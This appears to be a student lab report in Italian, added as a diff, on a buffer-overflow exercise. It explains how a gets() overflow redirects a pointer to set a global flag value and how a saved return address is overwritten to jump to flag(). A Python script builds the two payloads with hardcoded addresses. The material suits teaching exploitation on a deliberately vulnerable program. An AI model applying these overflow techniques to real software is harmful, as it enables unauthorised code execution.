@@ -1,0 +1,72 @@
+Relazione richiesta 2
+
+Per stampare "you win", a differenza della prima richiesta ho fatto usato anche la vulnerabilità della  prima gets() di get_input().
+
+Infatti essa mi serve per fare un overflow su buffer ed inserire dentro buf* l'indirizzo di flagvalue (indirizzo che inserisco dopo 128 caratteri).
+A questo punto la prima strcpy la uso per copiare il valore che voglio che abbia flagvalue (valore che ovviamente metto all'inizio del mio payload), ovvero quello per entrare dentro l'if di flag().
+
+Quindi il primo payload avrà la seguente forma: valore desiderato di flagvalue +caratteri fino a 128+ indirizzo di flagvalue+ "\n" per terminare la priam gets().
+
+L'indirizzo di flagvalue l'ho trovato con "info variables flagvalue".
+
+
+
+Il secondo payload è praticamente identico al precedente, con l'eccezione che ho rimosso lo schellcode (non mi serve più). Faccio sempre l'overflow usando la strcpy di vuln() ma questa volta in EIP inserisco l'indirizzo di flag().
+
+Così va in esecuzione flag() e, avendo messo il valore corretto grazie al primo payload, stampa la stringa desiderata.
+
+
+
+
+
+
+
+
+Ecco il codice usato:
+
+
+import os 
+import struct 
+
+
+string=0x0804a060 #indirizzo dell'array globale da 300
+buf_vuln=0xbffff178
+vuln=0x0804849b #indirizzo della funzione vuln trovato con pdisass
+
+flag=0x08048530
+flagvalueAddress=0x0804a18c
+flagvalueWantedValue = 0xdeadbeef
+
+
+
+finalInput1=struct.pack("I", flagvalueWantedValue)
+finalInput1+= "z"*(128-len(finalInput1))
+finalInput1+=struct.pack("I", flagvalueAddress)
+finalInput1+="\n"
+
+
+finalInput2= "a"*11
+finalInput2+= "b"
+finalInput2+= "c"
+finalInput2+= "z"*(148-len(finalInput2))
+
+finalInput2+=struct.pack("I", string) #faccio in modo che *buf punti all'indirizzo di string
+finalInput2+="AAA%AAsA" #ho creato un pattern di 20 per vedere cosa finisse in EIP e poi ho tagliato prima
+
+finalInput2+=struct.pack("I", vuln)
+finalInput2+="AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0A" #altri caratteri per arrivare fino a eip di vuln
+finalInput2+=struct.pack("I", flag) #infine inserisco l'indirizzo al quale saltare
+
+
+
+
+#stampe di debugging
+print(len(finalInput1))
+print(len(finalInput2))
+print(len(finalInput1+finalInput2))
+
+f=open("badfile", "w")
+f.write(finalInput1+finalInput2)
+f.close()
+
+
